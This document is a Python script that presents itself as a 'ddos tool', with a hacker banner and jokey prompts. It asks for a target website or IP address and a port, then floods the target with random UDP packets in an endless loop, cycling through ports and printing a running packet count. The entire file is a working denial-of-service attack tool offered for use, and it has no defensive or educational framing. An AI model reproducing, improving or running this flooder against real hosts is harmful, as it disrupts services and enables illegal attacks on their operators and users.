#coding ddos tool
from platform import system
import os
import time
import random
import socket
from urllib import request
import sys
path=os.getcwd()
path=os.path.join(path,'lib')
sys.path.append(path)
import colorama
from colorama import Fore,Back,Style
from tqdm.auto import tqdm
de_version="1.1"
colorama.init()
def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  
        command = 'cls'
    os.system(command)
    
def ddos():    
    def banner():
        clearConsole()
        print(Fore.RED+'''
 ▄▀▀▀█▄    ▄▀▀▀▀▄   ▄▀▀█▄   ▄▀▀▄ ▄▀▄ 
█  ▄▀  ▀▄ █      █ ▐ ▄▀ ▀▄ █  █ ▀  █ 
▐ █▄▄▄▄   █      █   █▄▄▄█ ▐  █    █ 
 █    ▐   ▀▄    ▄▀  ▄▀   █   █    █  
 █          ▀▀▀▀   █   ▄▀  ▄▀   ▄▀   
█                  ▐   ▐   █    █    
▐                          ▐    ▐    
by: Anon Nukea   
             
        '''+Style.RESET_ALL)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(560)

    def chech_con():
        try:
            request.urlopen('https://www.google.com/',timeout=3)
        except KeyboardInterrupt:
            print(Fore.RED+Style.BRIGHT + "stopped by user..." + Fore.RESET)
            exit()
        except:
            print(Fore.RED+Style.BRIGHT+'ur internet is offline xd'+Fore.RESET)
            exit()
 
    try:
        print(Fore.RED+Style.BRIGHT+"lets see ur connection xd.... "+Fore.RESET)
        for i in tqdm(range(30000)):
            print(end=Fore.GREEN+Style.BRIGHT+'\r')

        time.sleep(1)
        chech_con()

    except KeyboardInterrupt:
        print(Fore.RED +Style.BRIGHT+ "stopped by user" + Fore.RESET)
        exit()
    try:
        while True:
            banner()
            print(Fore.RED+Style.BRIGHT+"1."" ddos website"+Fore.RED+Style.BRIGHT+"\n2."+" ddos ip"+Fore.RED+Style.BRIGHT+"\n3. exit")
            opt=str(input(Fore.RED+Style.BRIGHT+"\n>>> "+Fore.RESET))
            if opt=='1':
                domain=str(input(Fore.YELLOW+Style.BRIGHT+"enter website xd (ex:shit.com):"+Fore.RESET))
                ip=socket.gethostbyname(domain)
                break
            elif opt=='2':
                ip = input(Fore.YELLOW+Style.BRIGHT+"skid ip: "+Fore.RESET)
                break
            elif opt=='3':
                time.sleep(1)
                print(Fore.RED+"cya xd..."+Fore.RESET)
                exit()
            else:
                print(Fore.RED+'wrong option xd...'+Fore.RESET)
                time.sleep(2)

        port =int(input(Fore.CYAN+Style.BRIGHT+"ports: "+Fore.RESET))

        print(Fore.YELLOW+Style.BRIGHT+"we start ddos...xd"+Style.RESET_ALL)
        clearConsole()
        time.sleep(2)

        print(Fore.GREEN+"ddosing :)...."+Style.RESET_ALL)
        for i in tqdm(range(300000)):
            print(end=Fore.LIGHTWHITE_EX+'\r')
        time.sleep(1)
        sent = 0
    except Exception as e:
        print(Fore.RED+"Something went wrong!")
        print("Reason: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent=sent+1
            port=port+1
            colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
            color_random = random.choice(colors)

            print(color_random+"%s packets %s are sent through port:%s" % (sent, ip, port))
            if port==65534:
                port=1
            elif port==1900:
                port=19010
    except Exception as e:
        print(Fore.RED+Style.BRIGHT+"TFinished\nReason: ",e,Fore.RESET)
        time.sleep(3)
        ddos()
    except KeyboardInterrupt:
        print(Fore.RED+Style.BRIGHT+"\nStopped by user"+Fore.RESET)



ddos()